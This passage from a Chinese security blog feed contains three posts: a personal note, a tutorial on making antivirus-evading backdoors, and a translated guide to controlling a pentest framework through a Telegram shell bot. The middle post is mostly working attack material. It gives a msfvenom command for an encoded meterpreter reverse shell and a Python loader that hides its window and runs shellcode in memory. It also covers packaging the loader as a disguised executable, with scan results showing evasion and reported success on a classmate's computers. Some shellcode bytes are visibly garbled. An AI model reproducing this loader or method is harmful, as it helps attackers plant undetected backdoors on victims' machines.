id="空"><a href="#空" class="headerlink" title="空"></a>空</h1><p>&#8195;实在想不到标题名字，故意”空“来代替。下面有几件事情想说明一下。<br>&#8195;1. 做一个小小调查，有心的读者可能发现了，我文笔风格转化了几次。从一开始的嘻嘻哈哈，到后来的严谨不苟言笑。<br>我想知道大家喜欢那种风格，或者说更侵向与那种风格，亦或者是希望我是那种风格呢？跪求大家在评论区留言。</p><p><img src="https://img-blog.csdnimg.cn/20191226165906698.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>&#8195; 2. 欢迎大家来问我一些关于博客上文章上的问题，但不支持大家来问我一些与博客文章之外的问题哦。大家有些问题其实我自己也不知道，另外博主自己还是一个学生，没很多时间和大家交流沟通一些问题，这点大家请见谅。</p><p><img src="https://img-blog.csdnimg.cn/20191226170609674.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>&#8195; 3. 大家别找我说收徒弟之类的东西，本人不收徒弟。自己还是一个菜鸡，实在你是想让我收你为徒也不是不可以。拜师费2w一次性付清，终生教你。教到你比我强，学习计划我来制定，不容质疑。就是这么霸道！<br><img src="https://img-blog.csdnimg.cn/20191226171746912.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>&#8195;多说一点，如果大家想看我一些东西，欢迎加我QQ群(群号请看置顶博客《About Me 关于我》)，群主就是我。大家可以看我一个名为荣耀的相册，里面记载了过去一年里我所获得的或大或小的荣耀。如果没兴趣当我没说。相册密码是：我的荣耀<img src="https://img-blog.csdnimg.cn/20191226172234830.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;契机&quot;&gt;&lt;a href=&quot;#契机&quot; class=&quot;headerlink&quot; title=&quot;契机&quot;&gt;&lt;/a&gt;契机&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20191226164253999.p
      
    
    </summary>
    
    
      <category term="总结" scheme="http://yoursite.com/categories/%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="2019" scheme="http://yoursite.com/tags/2019/"/>
    
  </entry>
  
  <entry>
    <title>Python加密shellcode免杀</title>
    <link href="http://yoursite.com/2019/12/24/Python%E5%8A%A0%E5%AF%86shellcode%E5%85%8D%E6%9D%80/"/>
    <id>http://yoursite.com/2019/12/24/Python%E5%8A%A0%E5%AF%86shellcode%E5%85%8D%E6%9D%80/</id>
    <published>2019-12-24T12:42:16.000Z</published>
    <updated>2020-05-05T13:12:21.326Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><hr><h1 id="前提准备"><a href="#前提准备" class="headerlink" title="前提准备"></a>前提准备</h1><p><strong>环境准备：</strong></p><ul><li>Windows7 32 位系统<ul><li>Shellcode 使用 kali linux Metasploit 生成 shellcode</li></ul></li></ul><p><strong>Windows7 需要安装的软件：</strong></p><ul><li>Python2.7</li><li>pip install pyinstaller</li><li>pip install pywin32</li><li>VCForPython27.msi(微软官网可以下载)</li></ul><hr><h1 id="制作流程"><a href="#制作流程" class="headerlink" title="制作流程"></a>制作流程</h1><h2 id="1-查IP地址"><a href="#1-查IP地址" class="headerlink" title="1. 查IP地址"></a>1. 查IP地址</h2><p>查看自己的使用监听MSF的IP地址 10.1.5.10<br><img src="https://i.loli.net/2019/12/24/dkMiteNEBufa9HA.png" alt="10.png"></p><hr><h2 id="2-生成shellcode"><a href="#2-生成shellcode" class="headerlink" title="2. 生成shellcode"></a>2. 生成shellcode</h2><p>红色字体需要修改成自己的ip地址和需要监听的端口号。</p><pre><code>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp_uuid LPORT=``x`` LHOST=``x.x.x.x`` -e   x86/shikata_ga_nai -i 11 -f py -o samny.py</code></pre><p>   <img src="https://s2.ax1x.com/2019/12/24/lP8vmd.png" alt="11"></p><hr><h2 id="3-替换shellcode"><a href="#3-替换shellcode" class="headerlink" title="3. 替换shellcode"></a>3. 替换shellcode</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   buf= <span class="string">b""</span>buf =  <span class="string">b""</span></span><br><span class="line">   buf += <span class="string">b"\xb8\x99\xfb\x4d\xa7\xd9\xea\xd9\x74\x24\xf4\x5f\x23"</span></span><br><span class="line">buf += <span class="string">b"\xc9\xb1\xa2\x83\xef\xfc\x31\x47\x0e\x03\xde\xf5\xaf"</span></span><br><span class="line">************省略内容，替换内容************</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">buf =  <span class="string">b""</span></span><br><span class="line">buf += <span class="string">b"\xb8\x99\xfb\x4d\xa7\xd9\xea\xd9\x74\x24\xf4\x5f\x23"</span></span><br><span class="line">buf += <span class="string">b"\xc9\xb1\xa2\x83\xef\xfc\x31\x47\x0e\x03\xde\xf5\xaf"</span></span><br><span class="line">buf += <span class="string">b"\x52\x3b\xc4\xe9\xe9\x9f\x23\x53\xac\x06\x9c\x45\x85"</span></span><br><span class="line">buf += <span class="string">b"\x89\xea\x37\xbe\x6a\x2e\x33\xf0\x1e\xbb\x3f\x80\x13"</span></span><br><span class="line">buf += <span class="string">b"\x76\xeb\x89\x4d\x9a\x48\xf1\xb3\x91\xcb\x32\x45\x2e"</span></span><br><span class="line">buf += <span class="string">b"\x4b\xdc\x96\x67\x9f\xb6\x14\x0a\x31\x26\x1a\xb8\xbd"</span></span><br><span class="line">buf += <span class="string">b"\xc1\xf5\x5d\x20\xcf\x4c\x95\x41\x7f\x19\xd2\x76\x96"</span></span><br><span class="line">buf += <span class="string">b"\x98\x6c\x89\x5b\x10\xb4\xfd\xf5\x2f\x4c\x78\x2f\xa0"</span></span><br><span class="line">buf += <span class="string">b"\x94\x1a\xbe\x0c\xbb\x5b\xfc\xeb\x81\x29\x54\x6e\x0c"</span></span><br><span class="line">buf += <span class="string">b"\x16\x91\xca\xdd\x71\x58\x89\x2f\xf3\x08\x08\x9e\xb8"</span></span><br><span class="line">buf += <span class="string">b"\xe2\xf5\x27\xb6\xb9\x31\x3c\xa7\x94\x90\x8c\xc6\x9d"</span></span><br><span class="line">buf += <span class="string">b"\x57\xd1\x11\x70\xed\x65\xf1\x3a\xc4\x15\x43\xba\x03"</span></span><br><span class="line">buf += <span class="string">b"\x97\xae\x81\x06\x77\x3e\xb0\xd0\xae\x99\x63\x1e\x3d"</span></span><br><span class="line">buf += <span class="string">b"\x80\x33\xac\x8b\xbb\x56\xb5\xc1\x4d\x5d\xab\x20\x34"</span></span><br><span class="line">buf += <span class="string">b"\xcd\x6c\x70\x0d\x85\x7b\xc0\x5d\xcc\xf6\x2d\xc0\x2b"</span></span><br><span class="line">buf += <span class="string">b"\x34\xa4\xc0\x0b\x1d\xee\xd8\xa3\xcb\x6d\xbe\x43\x37"</span></span><br><span class="line">buf += <span class="string">b"\x1d\xb6\x21\xa3\x2da\x20\x216\x89\x51\x2f\x01\x11\x97"</span></span><br><span class="line">buf += <span class="string">b"\x09\xbb\x54\x12e\xe8\x13\xeb\x02\x12\x01\x0f\xc1\x4e"</span></span><br><span class="line">buf += <span class="string">b"\xf3\xe4\x4w22\x1a\xa2\x38\x11\xb23\x4c\x76\x47\x11\x4e"</span></span><br><span class="line">buf += <span class="string">b"\xc8\xc6\x8swd\xed\xbc\x08\x9c\x65\xf8\x38\xf7\x00\x34"</span></span><br><span class="line">buf += <span class="string">b"\x34\x4e\xef\ax83\xqdsaff\x97\x8c\xde\x0c\x0e\xa4\xa4\x01"</span></span><br><span class="line">buf += <span class="string">b"\xc5\xd3\x61\x79\x83\qwx07\xec\x81\x04\x49\x8e\x9e\x10"</span></span><br><span class="line">buf += <span class="string">b"\xe8\xce\x64\x49\xb9\xc8\xc1\xdf\x4d\x7b\x9e\x6d\x94"</span></span><br><span class="line">buf += <span class="string">b"\x12\x50\xfc\x49\x8c\x17\x8a\x57\x69\xab\x2d\x85\x98"</span></span><br><span class="line">buf += <span class="string">b"\x52\x37\x11\xc9\x9f\x60\xed\x17\x31\x16\x4b\xae\x0e"</span></span><br><span class="line">buf += <span class="string">b"\xd4\x23\xef\x71\xd3\xc8\x35\x4b\x4w3\x3e\x7c\x39\x7c"</span></span><br><span class="line">buf += <span class="string">b"\x68\x60\x5b\x23\xc8\xab\x45\xa5\xe7\xef\x39\xd7\xad"</span></span><br><span class="line">buf += <span class="string">b"\xa6\xe7\x36\x6e\xa7\xef\xba\x01\x2e\x76\xa3\x0a\x79"</span></span><br><span class="line">buf += <span class="string">b"\xc5\xb7\x3d\xfa\xd1\xf7\xc7\x40\x30\x50\x95\x30\xdb"</span></span><br><span class="line">buf += <span class="string">b"\x13\x09\x91\x2f\x76\x91\x61\x9b\xea\x20\x5a\x0d\x5b"</span></span><br><span class="line">buf += <span class="string">b"\xa6\x96\xba\xac\xaf\x28\x1e\x2c\x33\x99\x8f\x00\x1d"</span></span><br><span class="line">buf += <span class="string">b"\x79\xec\x8a\x9b\xaa\xc4\xe8\x23\x50\xe6\xa9\xc8\xeb"</span></span><br><span class="line">buf += <span class="string">b"\x2b\x48\xc0\xe4\xfc\x93\x66\x9a\x44\xd4\xe3\xf7\x72"</span></span><br><span class="line">buf += <span class="string">b"\xdd\x26\x45\xb1\xec\x7c\xaf\x65\xd6\xf8\x53\xd0\xa8"</span></span><br><span class="line">buf += <span class="string">b"\x16\x9e\x39\xc6\x6c\xc1\x66\xf7\x28\xc7\x11\x52\xc9"</span></span><br><span class="line">buf += <span class="string">b"\xb9\x2e\xce\xec\x6c\xae\xe7\x55\x72\x89\xc0\x12\x92"</span></span><br><span class="line">buf += <span class="string">b"\x9b\x33\x0a\x1e\xe6\xc0\x91\xb6\x68\xf6\x26\xa5\xaa"</span></span><br><span class="line">buf += <span class="string">b"\x5d\xca\xd4\x60\x1d\x70\xde\xd8\x13\xad\x9c\xea\xa3"</span></span><br><span class="line">buf += <span class="string">b"\xe4\xbb\xdb\x3c\x27\x27\x50\xf9\x07\xe3\xa8\x04\xb5"</span></span><br><span class="line">buf += <span class="string">b"\xe9\xff\xd5\x5a\x51\x69\x33\x99\x5b\x27\x85\xcd\x36"</span></span><br><span class="line">buf += <span class="string">b"\x35\x22\xa9\x4f\xc6\x0d\xed\xf3\x40\xaa\x7b\x8e\xdb"</span></span><br><span class="line">buf += <span class="string">b"\xd8\xc9\x2b\x19\x78\x5a\x91\x61\x63\xf0\xae\x05\xcd"</span></span><br><span class="line">buf += <span class="string">b"\x28\xeb\x35\x15\x12\x67\x04\xb1\x93\xe8\x34\xc1\xc5"</span></span><br><span class="line">buf += <span class="string">b"\x21\xbf\x47\xb4\x15\x22\xbe\xb0\x0f\x43\x9d\xc4\x11"</span></span><br><span class="line">buf += <span class="string">b"\xe8\x92\x97\xfb\x75\xc7\x23\x70\xf3\x86\xcf\x55\xc4"</span></span><br><span class="line">buf += <span class="string">b"\xc0\xa6\x1a\x10\xab\xe9\xc1\xee\xf9\x13\x9c\xa0\xf9"</span></span><br><span class="line">buf += <span class="string">b"\xea\x1c\xaa\xasd1c\xbe\x6b\xe2\x8c\x91\x30\xbf\x20\x05"</span></span><br><span class="line">buf += <span class="string">b"\x3a\x82\x0f\x43\xe4\x4c\qwx54\x23\x26\xe4\x97\xc8\x5a"</span></span><br><span class="line">buf += <span class="string">b"\xd8\x6d\x5a\x74\x20\x51\x1c\xb9\x42\x3a\x2d\x96\xdd"</span></span><br><span class="line">buf += <span class="string">b"\x23\x3f\x72\xd6\x31\xe8\x67\x9c\xc8\xe5\x0b\x5e\xd7"</span></span><br><span class="line">buf += <span class="string">b"\xbd\xdf\x97\x96\x01\x44\x19\x78\x16\xd1\x45\xe7\xcd"</span></span><br><span class="line">buf += <span class="string">b"\x18\x1c\xb6\x84\xa8\x06\x3e\xe1"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PROT_READ = <span class="number">1</span></span><br><span class="line">PROT_WRITE = <span class="number">2</span></span><br><span class="line">PROT_EXEC = <span class="number">4</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">executable_code</span><span class="params">(buffer)</span>:</span></span><br><span class="line">    buf = c_char_p(buffer)</span><br><span class="line">    size = len(buffer)</span><br><span class="line">    addr = libc.valloc(size)</span><br><span class="line">    addr = c_void_p(addr)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> == addr: </span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">"Failed to allocate memory"</span>)</span><br><span class="line"></span><br><span class="line">    memmove(addr, buf, size)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC):</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">"Failed to set protection on buffer"</span>)</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line">VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc</span><br><span class="line">VirtualProtect = ctypes.windll.kernel32.VirtualProtect</span><br><span class="line">shellcode = bytearray(buf)</span><br><span class="line">whnd = ctypes.windll.kernel32.GetConsoleWindow()   </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> whnd != <span class="number">0</span>:</span><br><span class="line">       <span class="keyword">if</span> <span class="number">666</span>==<span class="number">666</span>:</span><br><span class="line">              ctypes.windll.user32.ShowWindow(whnd, <span class="number">0</span>)   </span><br><span class="line">              ctypes.windll.kernel32.CloseHandle(whnd)</span><br><span class="line"></span><br><span class="line">memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(<span class="number">0x3000</span>),</span><br><span class="line">                                          ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">old = ctypes.c_long(<span class="number">1</span>)</span><br><span class="line">VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),<span class="number">0x40</span>,ctypes.byref(old))</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell),</span><br><span class="line">                                     buf,</span><br><span class="line">                                     ctypes.c_int(len(shellcode)))</span><br><span class="line">shell = cast(memorywithshell, CFUNCTYPE(c_void_p))</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure><hr><h2 id="4-制作后门程序"><a href="#4-制作后门程序" class="headerlink" title="4. 制作后门程序"></a>4. 制作后门程序</h2><p>图标可以自己选择替换<br><img src="https://i.loli.net/2019/12/24/EFxIsLBrAY8wbZT.png" alt="6.png"></p><hr><h2 id="5-测试"><a href="#5-测试" class="headerlink" title="5. 测试"></a>5. 测试</h2><pre><code>use exploit/multi/handlerset payload windows/meterpreter/reverse_tcp_uuidset lhost 192.168.23.129set lport 8888set EnableStageEncoding trueset StageEncoder x86/fnstenv_mov</code></pre><p><img src="https://s2.ax1x.com/2019/12/24/lP8LlD.png" alt="14"></p><p>测试系统版本如下：</p><ul><li>Windows 7(32位和64位)</li><li>Windows server 8 </li><li>Windows 10 1903</li><li>真实环境也测试成功，利用同学的电脑Windows 7和Windows 10均能成功。<br><img src="https://i.loli.net/2019/12/24/rchmDGuCaPHJy7N.png" alt="3.png"><br><img src="https://i.loli.net/2019/12/24/V36rXeA9NZ2STFu.png" alt="2.png"></li></ul><hr><h1 id="在线查杀结果"><a href="#在线查杀结果" class="headerlink" title="在线查杀结果"></a>在线查杀结果</h1><p><img src="https://i.loli.net/2019/12/24/Kq68XIzrhZwfCQD.png" alt="7.png"><br><img src="https://i.loli.net/2019/12/24/D7iNk8WJlx6mvtE.png" alt="8.png"></p><p><img src="https://i.loli.net/2019/12/24/TMakXC9wnhOVLUP.png" alt="9.png"><br><img src="https://i.loli.net/2019/12/24/PboOgJTuZ3tUHkd.png" alt="4.png"><br><img src="https://i.loli.net/2019/12/24/ELV1JS4YD67NwtT.png" alt="5.png"></p><p><a href="http://r.virscan.org/language/zh-cn/report/5587ae4565ebc058d2b7846eeb12b27a" target="_blank" rel="noopener">http://r.virscan.org/language/zh-cn/report/5587ae4565ebc058d2b7846eeb12b27a</a></p><hr><h1 id="意料之外的坑"><a href="#意料之外的坑" class="headerlink" title="意料之外的坑"></a>意料之外的坑</h1><ol><li>环境不对，最后我特意去下载Windows 7（32位）镜像安装一个虚拟机才成功。本机缺少某种环境，但是始终找不到，最后无奈之举才得以如此。<br><img src="https://s2.ax1x.com/2019/12/24/lP8qSO.png" alt="12"></li><li>最新版的kali无法弹shell，这一步卡了我很久很久，最后我用<a href="https://blog.csdn.net/sun1318578251/article/details/90733372" target="_blank" rel="noopener">Pentestbox</a>里面的msf监听端口才得以成功。</li></ol><p><img src="https://s2.ax1x.com/2019/12/24/lP8XOH.png" alt="13"><br><img src="https://s2.ax1x.com/2019/12/24/lP8LlD.png" alt="14"></p><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/qq_41770175/article/details/98475696" target="_blank" rel="noopener">https://blog.csdn.net/qq_41770175/article/details/98475696</a><br><a href="https://secquan.org/Discuss/906" target="_blank" rel="noopener">https://secquan.org/Discuss/906</a><br><a href="https://www.cnblogs.com/backlion/p/6785870.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/6785870.html</a></p><hr><h1 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h1><p>本文中提到的shellcode仅供研究学习使用，请遵守《网络安全法》等相关法律法规。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;hr&gt;
&lt;h1 id=&quot;前提准备&quot;&gt;&lt;a href=&quot;#前提准备&quot; class=&quot;headerlink&quot; title=
      
    
    </summary>
    
    
      <category term="免杀" scheme="http://yoursite.com/categories/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="免杀" scheme="http://yoursite.com/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>Telegram机器人作为渗透测试框架</title>
    <link href="http://yoursite.com/2019/12/16/Telegram%E6%9C%BA%E5%99%A8%E4%BA%BA%E4%BD%9C%E4%B8%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/"/>
    <id>http://yoursite.com/2019/12/16/Telegram%E6%9C%BA%E5%99%A8%E4%BA%BA%E4%BD%9C%E4%B8%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/</id>
    <published>2019-12-16T08:55:24.000Z</published>
    <updated>2020-05-05T13:15:31.154Z</updated>
    
    <content type="html"><![CDATA[<dl><dt>Author<br>: Sofiane Hamlaoui</dt><dd><a href="https://medium.com/@SofianeHamlaoui/use-telegram-bot-as-a-penetration-testing-framework-a309c41dbc40" target="_blank" rel="noopener">原文链接</a></dd></dl><dl><dt>Translator</dt><dd>清水Samny</dd></dl><h1 id="想法来源"><a href="#想法来源" class="headerlink" title="想法来源"></a>想法来源</h1><p> 当我查看了浏览器书签，然后我注意medium<a href="国外类似于简书的应用">^1</a>有一篇有关<a href="https://medium.com/@arbazhussain/telegram-bot-for-hacking-pentesting-b7856db28ef" target="_blank" rel="noopener"><strong>Telegram bot的Hacking＆Pentesting</strong></a><em>的文章</em>。 我看了这篇文章并在我的<a href="https://twitter.com/S0fianeHamlaoui/status/1205414073837457408" target="_blank" rel="noopener"><strong>Twitter帐户</strong></a>上分享了它，然后发现有些CyberSec（或Interested by）喜欢该机器人的想法。</p><p>我创建了一个<a href="https://github.com/SofianeHamlaoui/Lockdoor-Framework" target="_blank" rel="noopener">Lockdoor</a>的渗透测试框架，那么为什么不使用我的工具进行相同的测试呢？</p><p>更新 : <a href="https://medium.com/@arbazhussain" target="_blank" rel="noopener">Arbaz Hussain</a> 的工具无法使用了。( 2019/12/15 )</p><p><code>Check it here</code>: <code>https://github.com/arbazkiraak/hackbot</code></p><hr><h1 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h1><p>这个想法是使用<a href="https://github.com/SofianeHamlaoui/Lockdoor-Framework" target="_blank" rel="noopener">Lockdoor Framework</a>，通过任何Telegram聊天或者信息来实现的。</p><p>基本上，它是一款从一个Telegram聊天中执行（指令）工具。当然，在做这些操作之前，您必须先配置和安装工具，然后配置机器人，最后使用它。</p><hr><h1 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h1><ol><li>配置和安装Lockdoor Frameword:</li></ol><p>首先，你查看这个Lockdoor框架安装指南。</p><p><a href="https://github.com/SofianeHamlaoui/Lockdoor-Framework/wiki/Installation?source=post_page-----a309c41dbc40----------------------" target="_blank" rel="noopener">SofianeHamlaoui /锁门框架<br>🔐Lockdoor框架：具有网络安全资源的渗透测试框架</a></p><ul><li>或者直接使用下面命令安装。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$: git clone https:&#x2F;&#x2F;github.com&#x2F;SofianeHamlaoui&#x2F;Lockdoor-Framework.git &amp;&amp; cd Lockdoor-Framework </span><br><span class="line">$: chmod +x .&#x2F;install.sh </span><br><span class="line">$: .&#x2F;install.sh</span><br></pre></td></tr></table></figure></li></ul><hr><ol start="2"><li>配置和安装Telegram机器人</li></ol><p>使用一款由<a href="https://github.com/botgram" target="_blank" rel="noopener">botgram</a>改进的<a href="https://github.com/botgram/shell-bot" target="_blank" rel="noopener">shell bot</a>。</p><ul><li><a href="https://github.com/SofianeHamlaoui/lockdoor-bot" target="_blank" rel="noopener">https://github.com/SofianeHamlaoui/lockdoor-bot</a></li></ul><p><img src="https://i.loli.net/2019/12/16/eA4rHTXLyQmSRFn.png" alt="1.png"></p><p>打开访问 <code>https://web.telegram.org/</code></p><p>开始一段会话和我们的机器人之父<a href="https://web.telegram.org/#/im?p=@BotFather" target="_blank" rel="noopener">botfather</a></p><hr><p><code>创建Telegram机器人</code></p><p><img src="https://i.loli.net/2019/12/16/5XrbMygAhdmwlnF.jpg" alt="2.jpeg"></p><ul><li>输入/newbot  新建一个机器人。</li><li>给机器人起一个名字。</li><li>给机器人创建一个用户名。</li><li>复制保存API</li></ul><hr><ul><li><p>配置并运行机器人服务器运行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Requirements : </span><br><span class="line">- python</span><br><span class="line">- node-pty</span><br><span class="line">- Telegram </span><br><span class="line">- Happiness :D</span><br></pre></td></tr></table></figure></li><li><p>安装</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$: git clone https:&#x2F;&#x2F;github.com&#x2F;SofianeHamlaoui&#x2F;Lockdoor-bot &amp;&amp; cd Lockdoor-bot</span><br><span class="line">$: npm install</span><br></pre></td></tr></table></figure><ul><li>开启服务器<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$: node server</span><br></pre></td></tr></table></figure></li></ul><p>第一次运行时，会根据问题答案自动创建配置文件<code>config.json</code>。你也可以自己编辑配置，参考<code>config.example.json</code>。</p><p><img src="https://i.loli.net/2019/12/16/rXvlHafi6YG7IU4.jpg" alt="3.jpeg"></p><hr><ul><li><p>在创建Telegram机器人之后复制API token。</p></li><li><p>打开访问机器人给出的链接(<a href="https://t.me/X/X/X/X/X/X/X/X/X/)并发送一条消息确认你的Telegram账号是机器人的主人。" target="_blank" rel="noopener">https://t.me/X/X/X/X/X/X/X/X/X/)并发送一条消息确认你的Telegram账号是机器人的主人。</a></p></li><li><p>运行服务器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$: node server</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/12/16/dvIektFP7U8bDQK.png" alt="4.png"></p><p><code>看到这个就代表着机器人运行成功！</code></p></li></ul><hr><ul><li>命令集：<br>下面列出很多命令方便你使用机器人，或者也可以查看<a href="https://github.com/SofianeHamlaoui/lockdoor-bot" target="_blank" rel="noopener">github的repo</a>。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">run - Execute command</span><br><span class="line">enter - Send input lines to command</span><br><span class="line">type - Type keys into command</span><br><span class="line">control - Type Control+Letter</span><br><span class="line">meta - Send the next typed key with Alt</span><br><span class="line">keypad - Toggle keypad for special keys</span><br><span class="line">redraw - Force the command to repaint</span><br><span class="line">end - Send EOF to command</span><br><span class="line">cancel - Interrupt command</span><br><span class="line">kill - Send signal to process</span><br><span class="line">status - View status and current settings</span><br><span class="line">cd - Change directory</span><br><span class="line">env - Manipulate the environment</span><br><span class="line">shell - Change shell used to run commands</span><br><span class="line">resize - Change the terminal size</span><br><span class="line">setsilent - Enable &#x2F; disable silent output</span><br><span class="line">setlinkpreviews - Enable &#x2F; disable link expansion</span><br><span class="line">setinteractive - Enable &#x2F; disable shell interactive flag</span><br><span class="line">help - Get help</span><br><span class="line">file - View and edit small text files</span><br><span class="line">upload - Upload and overwrite raw files</span><br><span class="line">r - Alias for &#x2F;run or &#x2F;enter</span><br></pre></td></tr></table></figure></li><li><em>导入命令*</em></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;run - to run a command</span><br><span class="line">&#x2F;enter - to Send input lines to command</span><br></pre></td></tr></table></figure><p>在配置并运行服务器之后，你可以使用Lockdoor Framework 